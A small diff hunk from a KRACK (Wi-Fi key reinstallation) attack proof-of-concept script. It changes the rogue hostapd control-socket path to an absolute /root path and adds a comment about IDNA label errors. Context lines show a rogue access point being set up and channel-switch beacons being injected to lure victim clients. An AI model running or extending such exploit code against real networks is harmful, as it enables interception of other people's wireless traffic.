@@ -936,7 +936,10 @@ class KRAckAttack():
 		log(STATUS, "Giving the rogue hostapd one second to initialize ...")
 		time.sleep(5)
 
-		self.hostapd_ctrl = Ctrl("../hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
+		# when domain name (encode) to idna, label empty or too long error, 
+		# that is because domain name uses "." to split label,
+		# every label limited to longest 63 characters or no empty.
+		self.hostapd_ctrl = Ctrl("/root/krackattacks-poc-zerokey/hostapd/hostapd_ctrl/" + self.nic_rogue_ap) # "hostapd_ctrl/"
 		self.hostapd_ctrl.attach()
 
 		# Inject some CSA beacons to push victims to our channel
